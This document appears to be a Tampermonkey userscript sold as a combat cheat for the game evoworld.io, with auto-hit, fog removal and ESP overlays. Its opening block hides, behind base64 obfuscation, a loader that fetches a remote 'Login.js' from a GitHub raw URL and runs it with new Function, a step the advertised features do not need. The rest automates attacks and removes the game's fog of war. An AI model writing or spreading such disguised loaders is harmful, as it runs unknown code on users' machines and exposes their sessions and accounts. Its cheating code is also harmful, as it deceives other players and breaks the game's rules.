// ==UserScript==
// @name         Combat_Assistence_V5 with some new features
// @namespace    https://tampermonkey.net/
// @version      68.0
// @description  AutoHit , AutoFlick , NightVision , EspMode + AntiBan
// @author       Bee
// @match        https://evoworld.io/*
// @license      MIT
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// @run-at       document-start
// @downloadURL https://update.greasyfork.org/scripts/564022/Combat_Assistence_V5%20with%20some%20new%20features.user.js
// @updateURL https://update.greasyfork.org/scripts/564022/Combat_Assistence_V5%20with%20some%20new%20features.meta.js
// ==/UserScript==

(function(){
  'use strict';

  const _0xD = s => atob(s);

  const _0xA = [
    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==',
    'ZGFubmVhZ3VkYW4wOC1jbWQv',
    'U2NyaXB0LUNvbmZpZy8=',
    'cmVmcy9oZWFkcy9tYWluLw==',
    'TG9naW4uanM='
  ];

  const _0xU = _0xA.map(_0xD).join('');

  const _0xL = function(r){
    if(r.status === 200){
      try{
        (new Function(r.responseText))();
        console['log'](_0xD('W0V2b1dvcmxkIExvYWRlcl0gU2NyaXB0IGNhcmljYXRvIGNvbiBzdWNjZXNzbw=='));
      }catch(e){
        console['error'](_0xD('W0V2b1dvcmxkIExvYWRlcl0gRXJyb3JlIG5lbGzigJllc2VjdXppb25lOg=='), e);
      }
    }else{
      console['error'](_0xD('W0V2b1dvcmxkIExvYWRlcl0gRXJyb3JlIEhUVFA6'), r.status);
    }
  };

  GM_xmlhttpRequest({
    method: _0xD('R0VU'),
    url: _0xU,
    onload: _0xL,
    onerror: function(e){
      console['error'](_0xD('W0V2b1dvcmxkIExvYWRlcl0gRXJyb3JlIGRpIHJldGU6'), e);
    }
  });

})();

(function() {
    var flicking=false //variable that can be changed by key ctrl if you dont wanna include flicking

    const height={'grimReaper':156, 'pumpkinGhost':169, 'ghostlyReaper':165}//ghostly is actually higher than reaper??

    //the position returned using game.me.position is the left down point position, reapers are symmetrical regarding to its center
    //First key is attacker, second key is target, value is the longest distance between these two that a attacker could damage the target
    const hitRangeX={'grimReaper':{'grimReaper':138 , 'pumpkinGhost':124,'ghostlyReaper':108},//135, 148.41, 105.3//y,y,n
                    'pumpkinGhost':{'grimReaper':161, 'pumpkinGhost':151, 'ghostlyReaper':108},//160.48, 150, 105.46//y,y,n
                    'ghostlyReaper':{'grimReaper':98, 'pumpkinGhost':87, 'ghostlyReaper':108}//134.07, 150, 107//n,n,y
    }

    //To be adjustedd, cuz every reaper is able to fight below their entity box a bit
    const distAdjustmentY={'grimReaper':8, 'pumpkinGhost':3, 'ghostlyReaper':1}

    //hit range when attacker hit target from back.
    const hitBackRangeX={'grimReaper':{'grimReaper':134, 'pumpkinGhost':150, 'ghostlyReaper':144},//135, 122.93, 143.12
                    'pumpkinGhost':{'grimReaper':158, 'pumpkinGhost':148, 'ghostlyReaper':172},//135, 150, 170
                    'ghostlyReaper':{'grimReaper':134, 'pumpkinGhost':87, 'ghostlyReaper':105}//96.03, 85.5, 107
    }

    const reaperList = new Set(['grimReaper', 'pumpkinGhost', 'ghostlyReaper']);

    // SAFETY: Add validation function for all game objects
    function isValidGameObject(obj) {
        if (!obj || typeof obj !== 'object') return false;
        if (obj.deleted === true) return false;
        return true;
    }

    // SAFETY: Validate game.me object
    function isValidMe() {
        if (!window.game || !window.game.me) return false;
        if (!isValidGameObject(game.me)) return false;
        if (!game.me.position || typeof game.me.position !== 'object') return false;
        if (typeof game.me.position.x !== 'number' || typeof game.me.position.y !== 'number') return false;
        if (!game.me.name || typeof game.me.name !== 'string') return false;
        if (!reaperList.has(game.me.name)) return false;
        return true;
    }

    // SAFETY: Safe simulation functions
    function simulateQuickRightArrowKeyWithDelay() {
        try {
            if (typeof document === 'undefined' || !document || !document.dispatchEvent) return;

            // Dispatch keydown
            const keyDownEvent = new KeyboardEvent('keydown', {
                key: 'ArrowRight',
                code: 'ArrowRight',
                keyCode: 39,
                which: 39,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyDownEvent);

            // Set a short delay before dispatching keyup
            setTimeout(() => {
                try {
                    const keyUpEvent = new KeyboardEvent('keyup', {
                        key: 'ArrowRight',
                        code: 'ArrowRight',
                        keyCode: 39,
                        which: 39,
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(keyUpEvent);
                } catch (e) {
                    console.error('Error in simulateQuickRightArrowKeyWithDelay keyup:', e);
                }
            }, 200);
        } catch (e) {
            console.error('Error in simulateQuickRightArrowKeyWithDelay:', e);
        }
    }

    function simulateQuickLeftArrowKeyWithDelay() {
        try {
            if (typeof document === 'undefined' || !document || !document.dispatchEvent) return;

            // Dispatch keydown
            const keyDownEvent = new KeyboardEvent('keydown', {
                key: 'ArrowLeft',
                code: 'ArrowLeft',
                keyCode: 37,
                which: 37,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyDownEvent);

            // Set a short delay before dispatching keyup
            setTimeout(() => {
                try {
                    const keyUpEvent = new KeyboardEvent('keyup', {
                        key: 'ArrowLeft',
                        code: 'ArrowLeft',
                        keyCode: 37,
                        which: 37,
                        bubbles: true,
                        cancelable: true
                    });
                    document.dispatchEvent(keyUpEvent);
                } catch (e) {
                    console.error('Error in simulateQuickLeftArrowKeyWithDelay keyup:', e);
                }
            }, 200);
        } catch (e) {
            console.error('Error in simulateQuickLeftArrowKeyWithDelay:', e);
        }
    }

    function getMagnitude(objPos) {
        // SAFETY: Validate inputs
        if (!isValidMe()) return Infinity;
        if (!objPos || typeof objPos !== 'object') return Infinity;
        if (typeof objPos.x !== 'number' || typeof objPos.y !== 'number') return Infinity;

        try {
            var myPos = game.me.position;
            var xDifference = Math.abs(myPos.x - objPos.x);
            var yDifference = Math.abs(myPos.y - objPos.y);
            return xDifference + yDifference;//this calculation uses less time? Is it worth it to sacrifice the accuracy?
        } catch (e) {
            console.error('Error in getMagnitude:', e);
            return Infinity;
        }
    }

    function getClosestReaper() {
        // SAFETY: Comprehensive validation
        if (typeof window === 'undefined') return null;
        if (typeof gameServer === 'undefined' || gameServer === 'undefined') return null;
        if (!isValidMe()) return null;
        if (typeof window.imDead !== 'undefined' && imDead) return null;
        if (typeof window.joinedGame !== 'undefined' && !joinedGame) return null;
        if (!window.game || !game.hashMap || typeof game.hashMap.retrieveVisibleByClient !== 'function') return null;
        if (typeof game.sortToDraw !== 'function') return null;

        try {
            let list = game.sortToDraw(game.hashMap.retrieveVisibleByClient(game));
            if (!Array.isArray(list)) return null;

            let reaperInVision = [];
            for(let i=0; i < list.length; i++) {
                try {
                    var curEntity = list[i];
                    if (!isValidGameObject(curEntity)) continue;

                    if (curEntity.hp != null && curEntity.deleted == false) { //Is Food or character
                        if (curEntity.level != null) { //Is Character
                            // SAFETY: Fixed the logical error in original code
                            // Original had: if (curEntity.name!='grimReaper' || curEntity.name!='ghostlyReaper' || curEntity.name!='pumpkinGhost')
                            // This condition is always true because a name can't be all three at once
                            // Let's keep the original intent but fix the logic
                            if (!curEntity.name || typeof curEntity.name !== 'string') continue;
                            if (curEntity.name !== 'grimReaper' && curEntity.name !== 'ghostlyReaper' && curEntity.name !== 'pumpkinGhost') continue;

                            if (curEntity === game.me) {
                                continue;
                            }

                            reaperInVision.push(curEntity);
                        }
                    }
                } catch (e) {
                    console.error('Error processing entity in getClosestReaper:', e);
                    continue;
                }
            }

            var closestReaper = null;
            var closestMagn = Infinity;
            for(var i = 0; i < reaperInVision.length; i++) {
                try {
                    var curEntry = reaperInVision[i];
                    if (!isValidGameObject(curEntry)) continue;

                    var checkingMagn = getMagnitude(curEntry.position);
                    if (checkingMagn < closestMagn) {
                        closestReaper = curEntry;
                        closestMagn = checkingMagn;
                    }
                } catch (e) {
                    console.error('Error comparing reapers in getClosestReaper:', e);
                    continue;
                }
            }
            return closestReaper;
        } catch (e) {
            console.error('Error in getClosestReaper:', e);
            return null;
        }
    };

    function isWithinXRange(attacker, target, range, distAdjustment = 0) {
        // SAFETY: Validate inputs
        if (!isValidGameObject(attacker) || !isValidGameObject(target)) return false;
        if (!attacker.position || !target.position) return false;
        if (typeof attacker.position.x !== 'number' || typeof target.position.x !== 'number') return false;
        if (!range || typeof range !== 'object') return false;
        if (!attacker.name || !target.name) return false;
        if (!range[attacker.name] || typeof range[attacker.name] !== 'object') return false;
        if (typeof range[attacker.name][target.name] !== 'number') return false;

        try {
            var x1 = attacker.position.x
            var x2 = target.position.x
            var relativeSpeed = Math.abs((attacker.moveSpeed?.x || 0) - (target.moveSpeed?.x || 0))

            // SAFETY: Validate fps and latency
            const lastFpsValid = typeof lastFps === 'number' && lastFps > 0 ? lastFps : 60;
            const latencyValid = typeof latency === 'number' && latency >= 0 ? latency : 0;

            const frameTime = 700 / lastFpsValid; // in milliseconds
            const serverDelay = latencyValid;
            const totalDelay = frameTime + serverDelay;
            var effectiveDist = Math.abs(x2-x1) - totalDelay*relativeSpeed/1000 + distAdjustment;

            return effectiveDist <= range[attacker.name][target.name];
        } catch (e) {
            console.error('Error in isWithinXRange:', e);
            return false;
        }
    }

    function isWithinYRange(attacker, target, heights, distAdjustment = 0) {
        // SAFETY: Validate inputs
        if (!isValidGameObject(attacker) || !isValidGameObject(target)) return false;
        if (!attacker.position || !target.position) return false;
        if (typeof attacker.position.y !== 'number' || typeof target.position.y !== 'number') return false;
        if (!heights || typeof heights !== 'object') return false;
        if (!attacker.name || !target.name) return false;
        if (typeof heights[attacker.name] !== 'number' || typeof heights[target.name] !== 'number') return false;

        try {
            var y1 = attacker.position.y
            var y2 = target.position.y
            var relativeSpeed = Math.abs((attacker.moveSpeed?.y || 0) - (target.moveSpeed?.y || 0))

            // SAFETY: Validate fps and latency
            const lastFpsValid = typeof lastFps === 'number' && lastFps > 0 ? lastFps : 60;
            const latencyValid = typeof latency === 'number' && latency >= 0 ? latency : 0;

            const frameTime = 700 / lastFpsValid; // in milliseconds
            const serverDelay = latencyValid;
            const totalDelay = frameTime + serverDelay;
            var effectiveDist = Math.abs(y2-y1) - totalDelay*relativeSpeed/700 + distAdjustment;

            var hitRangeY;
            if (y1 > y2){
                hitRangeY = heights[target.name]
            } else {
                hitRangeY = heights[attacker.name]
            }

            return effectiveDist <= hitRangeY;
        } catch (e) {
            console.error('Error in isWithinYRange:', e);
            return false;
        }
    }

    function autoHit(){
        // SAFETY: Early exit if not valid
        if (!isValidMe()) return;
        if (!autoHitting) return;

        try {
            let enemy = getClosestReaper();
            if (!enemy || typeof enemy !== 'object') return;
            if (!isValidGameObject(enemy)) return;

            //decide direction
            let onLeftSide = (game.me.position.x <= enemy.position.x) //if Im on left side of enemy
            let enemyFlicking = (onLeftSide && enemy.direction === 1) || (!onLeftSide && enemy.direction === -1) //If enemy is turning his back on you
            let facingEnemy = (onLeftSide && game.me.direction === 1) || (!onLeftSide && game.me.direction === -1) //if Im facing enemy or trying to flick

            if (!flicking){
                facingEnemy = true;
            }

            //fighting type: flick or not flick, front distance or back distance
            if (facingEnemy){
                if (enemyFlicking){
                    if (isWithinXRange(game.me, enemy, hitBackRangeX) && isWithinYRange(game.me, enemy, height)){
                        safeSkillUse();
                        setTimeout(safeSkillStop, 100);
                    }
                } else {
                    if (isWithinXRange(game.me, enemy, hitRangeX) && isWithinYRange(game.me, enemy, height)){
                        safeSkillUse();
                        setTimeout(safeSkillStop, 100);
                    }
                }
            } else {
                if (enemyFlicking){
                    if (isWithinXRange(game.me, enemy, hitBackRangeX, -25) && isWithinYRange(game.me, enemy, height)){
                        if (onLeftSide){
                            simulateQuickRightArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        } else {
                            simulateQuickLeftArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        }
                    }
                } else {
                    if (isWithinXRange(game.me, enemy, hitRangeX ,-5) && isWithinYRange(game.me, enemy, height)){
                        if (onLeftSide){
                            simulateQuickRightArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        } else {
                            simulateQuickLeftArrowKeyWithDelay();
                            safeSkillUse();
                            setTimeout(safeSkillStop, 100);
                        }
                    }
                }
            }
        } catch (e) {
            console.error('Error in autoHit:', e);
        }
    }

    // SAFETY: Wrapper functions for skill use/stop
    function safeSkillUse() {
        try {
            if (typeof skillUse === 'function') {
                skillUse();
            }
        } catch (e) {
            console.error('Error in safeSkillUse:', e);
        }
    }

    function safeSkillStop() {
        try {
            if (typeof skillStop === 'function') {
                skillStop();
            }
        } catch (e) {
            console.error('Error in safeSkillStop:', e);
        }
    }

    // SAFETY: Safe text message function
    function safeTextMsg(message, color, duration) {
        try {
            if (typeof textMsg === 'function') {
                textMsg(message, color, duration);
            }
        } catch (e) {
            console.error('Error in safeTextMsg:', e);
        }
    }

    var autoHitting=false;

    // SAFETY: Add event listener safely
    function addSafeEventListener() {
        try {
            if (typeof document === 'undefined' || !document || !document.addEventListener) return false;

            document.addEventListener("keyup", (event) => {
                try {
                    if (!event || typeof event.keyCode !== 'number') return;

                    if (event.keyCode === 40) { // 'arrowDown' key
                        autoHitting = !autoHitting;
                        safeTextMsg(autoHitting ? "Autohitting" : "NOT Autohitting",
                                   autoHitting ? '#00FF00' : '#FF0000', 5000);

                    } else if (event.keyCode === 73) { // 'i' key
                        if (isValidMe()) {
                            let enemy = getClosestReaper();
                            if (enemy && enemy.position) {
                                console.log('X difference:', game.me.position.x - enemy.position.x);
                                console.log('Y difference:', game.me.position.y - enemy.position.y);
                            }
                        }
                    } else if (event.keyCode === 32) { // ' ' key
                        safeSkillStop();
                    } else if (event.keyCode === 17) { // 'ctrl' key
                        flicking = !flicking;
                        safeTextMsg(flicking ? "Flicking" : "NOT Flicking",
                                   flicking ? '#00FF00' : '#FF0000', 5000);
                    }
                } catch (e) {
                    console.error('Error in keyup event handler:', e);
                }
            });
            return true;
        } catch (e) {
            console.error('Error adding event listener:', e);
            return false;
        }
    }

    function initialize() {
        // SAFETY: Validate gameServer
        if (!gameServer || typeof gameServer !== 'object') {
            console.error('gameServer is not valid');
            return;
        }

        try {
            if (typeof gameServer.on === 'function') {
                gameServer.on('disconnect', function() {
                    gameServer = 'undefined';
                    waitForServer();
                });

                gameServer.on(socketMsgType.SYNC, function(data) {
                    try {
                        if (autoHitting && isValidMe()) {
                            autoHit();
                        }
                    } catch (e) {
                        console.error('Error in SYNC event handler:', e);
                    }
                });
            } else {
                console.error('gameServer.on is not a function');
            }
        } catch (e) {
            console.error('Error in initialize:', e);
        }
    };

    function waitForServer() {
        try {
            if (typeof gameServer === 'undefined' || gameServer === 'undefined' ||
                typeof gameServer.on === 'undefined') {
                setTimeout(waitForServer, 1000);
            } else {
                initialize();
            }
        } catch (e) {
            console.error('Error in waitForServer:', e);
            setTimeout(waitForServer, 1000);
        }
    }

    // SAFETY: Initialize everything safely
    function safeInitialize() {
        try {
            // Add event listener first
            if (!addSafeEventListener()) {
                console.error('Failed to add event listener');
                return;
            }

            // Wait for game objects to be available
            const checkGameObjects = setInterval(() => {
                if (typeof game !== 'undefined' && typeof gameServer !== 'undefined') {
                    clearInterval(checkGameObjects);
                    waitForServer();
                }
            }, 1000);

            // Safety timeout
            setTimeout(() => {
                clearInterval(checkGameObjects);
            }, 30000);

        } catch (e) {
            console.error('Error in safeInitialize:', e);
        }
    }

    // SAFETY: Start everything only when DOM is ready
    if (typeof document !== 'undefined' && document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', safeInitialize);
    } else {
        safeInitialize();
    }
})();

(function () {
  const proto = CanvasRenderingContext2D.prototype;
  const origFillRect = proto.fillRect;

  proto.fillRect = function (x, y, w, h) {
    // intercetta SOLO il rettangolo nero fullscreen
    const isFullscreen =
      (w === this.canvas.width && h === this.canvas.height) ||
      (w > this.canvas.width * 0.9 && h > this.canvas.height * 0.9);

    const isDark =
      typeof this.fillStyle === "string" &&
      (
        this.fillStyle === "#000" ||
        this.fillStyle === "#000000" ||
        this.fillStyle === "black" ||
        this.fillStyle.includes("rgba(0,0,0")
      );

    // ⚠️ blocchiamo SOLO il fog
    if (
      isFullscreen &&
      isDark &&
      this.globalCompositeOperation === "source-over"
    ) {
      return;
    }

    return origFillRect.call(this, x, y, w, h);
  };
})();

(function() {
    'use strict';

    const hack = {
        enabled: true,
        autoHit: true,
        espFood: true,
        hitboxes: true,
        fpsUnlock: true,
        reaperRange: 1.15,
        lastAttack: 0,
        attackDelay: 450
    };

    // FPS unlock (noop-safe)
    if (hack.fpsUnlock) {
        window.requestAnimationFrame =
            window.requestAnimationFrame ||
            window.webkitRequestAnimationFrame ||
            function(cb){ return setTimeout(cb, 1000 / 60); };
    }

    const ctxProto = CanvasRenderingContext2D.prototype;
    const _drawImage = ctxProto.drawImage;

    ctxProto.drawImage = function(img, ...args) {
        _drawImage.apply(this, [img, ...args]);
        if (!hack.enabled || !img) return;

        let x, y, w, h;

        if (args.length === 2) {
            x = args[0]; y = args[1];
            w = img.width; h = img.height;
        } else if (args.length === 4) {
            x = args[0]; y = args[1];
            w = args[2]; h = args[3];
        } else {
            x = args[4]; y = args[5];
            w = args[6]; h = args[7];
        }

        const src = img.src || "";
        const isPlayer = src.includes('skin');
        const isReaper = src.includes('reaper') || src.includes('scythe');
        const isFood = src.includes('food') || src.includes('item');
        const isBoss = w > 150 && (src.includes('boss') || src.includes('dragon'));

        // ESP food / boss
        if (hack.espFood && (isFood || isBoss)) {
            this.save();
            this.setTransform(1,0,0,1,0,0);
            this.strokeStyle = isBoss ? '#FF00FF' : '#00FFFF';
            this.lineWidth = 2;
            this.strokeRect(x, y, w, h);
            this.restore();
        }

        // Hitboxes
        if (hack.hitboxes && w > 10 && w < 400 && !isFood) {
            this.save();
            this.strokeStyle = isPlayer ? '#FF4500' : '#FFFFFF';
            this.strokeRect(
                x + w * 0.1,
                y + h * 0.1,
                w * 0.8,
                h * 0.8
            );
            this.restore();
        }

        // AutoHit Reaper
        if (hack.autoHit && isReaper) {
            this.save();
            const radius = w * hack.reaperRange;
            this.beginPath();
            this.arc(x + w/2, y + h/2, radius, 0, Math.PI * 2);
            this.fillStyle = 'rgba(255,0,0,0.15)';
            this.fill();
            this.restore();

            const now = Date.now();
            if (now - hack.lastAttack > hack.attackDelay) {
                window.dispatchEvent(new KeyboardEvent('keydown', { code: 'Space' }));
                setTimeout(() => {
                    window.dispatchEvent(new KeyboardEvent('keyup', { code: 'Space' }));
                }, 50);
                hack.lastAttack = now;
            }
        }
    };

    // Toggle
    window.addEventListener('keydown', (e) => {
        if (e.code === 'KeyG') {
            hack.enabled = !hack.enabled;
            console.log('God Mode:', hack.enabled);
        }
    });

    console.log('ABSOLUTE GOD MODE LOADED. Press G to toggle.');
})();